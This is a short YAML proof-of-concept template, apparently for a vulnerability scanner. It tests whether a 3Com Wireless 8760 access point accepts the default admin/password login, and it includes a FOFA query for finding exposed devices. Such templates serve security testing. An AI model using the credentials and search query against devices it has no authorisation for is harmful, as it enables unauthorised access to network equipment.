id: poc-yaml-3com-wireless-8760-dual-radio-default-password-login
info:
  name: 3Com Wireless 8760 Dual Radio 默认密码登录漏洞
  severity: high
  tags:
  - 弱口令
  finger: 3crwe8760
  fofa: title="3COM"
requests:
- method: POST
  path: /index.htm
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: userid=admin&passwd=password&Submit=LOGIN
  expression: status_code == 200 && contains(body,"3Com") && contains(body,"alt=\"Advanced
    Configuration\"") && contains(body,"image/setup_wizard") && !contains(body,"Invalid
    Login!")
variables: {}
transport: http
